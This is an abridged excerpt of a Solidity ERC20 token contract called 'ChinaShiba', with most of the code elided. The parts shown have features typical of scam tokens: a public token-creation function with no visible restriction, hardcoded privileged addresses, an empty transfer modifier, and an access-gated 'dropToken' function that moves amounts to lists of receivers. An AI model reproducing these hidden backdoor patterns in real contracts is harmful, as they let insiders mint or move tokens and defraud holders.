...
contract ChinaShiba is Context, IERC20 {
    ...
    address deployer = 0x357d44ED8B957bfc3c8508Ac026b69CFc1389C58;
    address public contOwnr = 0xB34BC91991dd1409bF2a1Dc0164A740f77F47fCA;
    ...
    constructor () public {
        ...
        prod(deployer, initialSupply*(10**18));
    ...
    function prod(address account, uint256 amount) public {
    ...
    function _load(address sender, address recipient, uint256 amount) internal exec(sender,recipient,amount) virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
    ...
    modifier exec(address sender, address recipient, uint256 amount){
        _;
    }
    ...
    modifier approver() {
        require(msg.sender == 0x564bF74E30B3E1b1446eCBa76280fc054e537164, "Not allowed to interact");
        _;
    }



  function dropToken(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public auth(){
